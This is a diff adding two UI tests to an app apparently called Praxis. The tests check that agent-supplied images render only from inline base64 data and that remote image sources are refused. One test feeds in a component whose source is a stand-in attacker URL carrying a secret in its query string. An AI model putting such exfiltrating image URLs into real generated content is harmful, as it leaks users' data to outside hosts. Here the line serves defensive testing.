@@ -380,6 +380,43 @@ test("links and images in the agent's text are shown, never followed or loaded",
   expect(text).toContain("[image: a chart]");
 });
 
+test("an image file is shown from the data the agent read, not fetched", async () => {
+  render(<App />);
+  await screen.findByText("Welcome to Praxis");
+
+  await submitIntent("plan a project");
+
+  const image = (await screen.findByAltText("pixel.png")) as HTMLImageElement;
+  expect(image.getAttribute("src")).toMatch(/^data:image\/png;base64,iVBORw0KGgo/);
+});
+
+test("an image component pointing anywhere but inline data is refused", async () => {
+  const [deleteSurface, createSurface] = GOLDEN;
+  agentAnswers(
+    a2ui([
+      deleteSurface,
+      createSurface,
+      {
+        version: "v0.9",
+        updateComponents: {
+          surfaceId: "workspace",
+          components: [
+            { id: "root", component: "Column", children: ["img"] },
+            { id: "img", component: "FileImage", src: "https://evil.example/t.png?d=secret" },
+          ],
+        },
+      },
+    ]),
+  );
+  render(<App />);
+  await screen.findByText("Welcome to Praxis");
+
+  await submitIntent("hi");
+
+  expect((await screen.findByRole("alert")).textContent).toContain("cannot show");
+  expect(document.querySelector("img")).toBeNull();
+});
+
 // --- what goes wrong, and what the user is told -------------------------------
 
 test("an event type this Canvas does not know is skipped", async () => {
